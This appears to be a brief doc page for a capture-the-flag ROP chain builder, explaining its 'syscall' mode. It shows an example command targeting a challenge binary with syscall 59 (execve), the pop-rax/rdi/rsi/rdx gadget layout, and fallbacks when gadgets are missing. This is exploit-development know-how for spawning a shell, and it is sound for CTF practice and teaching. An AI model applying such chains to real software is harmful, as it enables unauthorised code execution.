# syscall — the kernel-entry chain


Sets rax = the syscall number, the arg registers, and fires a syscall
gadget — for static binaries or when libc calls are unavailable.

    python3 tools/rop_chain.py ./chal syscall --num 59 --arg 0x404030 --arg2 0 --arg3 0

## The packing

    pop rax ; num
    pop rdi ; arg
    pop rsi ; arg2
    pop rdx ; arg3
    syscall_gadget

## The falsifier

No `syscall` gadget or no `pop rax` — the tool reports it; the route
needs ret2csu or a libc call instead.
